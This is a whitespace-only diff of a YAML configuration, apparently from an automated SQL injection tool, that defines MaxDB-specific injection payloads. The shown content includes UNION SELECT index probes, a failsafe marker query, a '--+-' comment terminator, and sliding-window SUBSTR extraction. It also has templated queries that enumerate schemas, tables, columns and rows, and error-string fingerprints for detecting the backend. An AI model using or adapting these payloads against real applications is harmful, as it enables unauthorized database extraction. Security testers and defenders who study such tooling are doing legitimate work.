@@ -1,8 +1,8 @@
 vendor: MaxDB
 
-resource: 
+resource:
  info: |
-  SELECT 
+  SELECT
       '-'
       || id
       || '${enclose_value_sql}'
@@ -12,15 +12,15 @@ resource:
       || '${trail_sql}'
       r
   from sysinfo.VERSION
-  
- schema: 
+
+ schema:
   database: |
-   select 
+   select
        rr
        || '${trail_sql}'
        r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            || trim(t.schemaname)
            || '${separator_qte_sql}0${enclose_value_sql}'
@@ -32,14 +32,14 @@ resource:
        group by t.schemaname
        ${limit}
    ) a
-   
+
   table: |
-   select 
+   select
        rr
        || '${trail_sql}'
        r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            || trim(t.tablename)
            || '${separator_qte_sql}0${enclose_value_sql}'
@@ -51,14 +51,14 @@ resource:
        group by t.tablename
        ${limit}
    ) a
-   
+
   column: |
-   select 
+   select
        rr
        || '${trail_sql}'
        r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            || trim(t.COLUMNNAME)
            || '${separator_qte_sql}0${enclose_value_sql}'rr
@@ -69,34 +69,34 @@ resource:
        group by t.COLUMNNAME
        ${limit}
    ) a
-   
-  row: 
+
+  row:
    query: |
-    select 
+    select
         rr
         || '${trail_sql}'
         r
     from (
-        select 
+        select
             '${enclose_value_sql}'
             || trim(t.s)
             || '${separator_qte_sql}0${enclose_value_sql}'
             rr
-        from 
+        from
             (select distinct ${fields} s from ${database}.${table}) t,
             (select distinct ${fields} s from ${database}.${table}) t1
         where t.s >= t1.s
         group by t.s
         ${limit}
     ) a
-   fields: 
+   fields:
     field: trim(ifnull(chr(${field.value}), ''))
     concat: "|| '%7f' ||"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: |
-   select 
+   select
        '${lead}'
        ||SUBSTR(
            r,
@@ -110,20 +110,20 @@ strategy:
   failsafe: select (1337${indice}7330%2b1) r from dual
   calibrator: |
    rpad(
-       '${calibrator_sql}', 
-       1024, 
-       '${calibrator_sql}', 
+       '${calibrator_sql}',
+       1024,
+       '${calibrator_sql}',
        1025
    )
   limitBoundary: 1
   endingComment: --+-
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - "Warning: maxdb::"
     - maxdb.query
     - "): Invalid end of SQL statement"
-    
- normal: 
+
+ normal:
   indices: union select ${result_range} from (${indice_unique})z
   capacity: (select '${lead}${indice}' || ${calibrator} from dual)
   orderBy: order by 1337
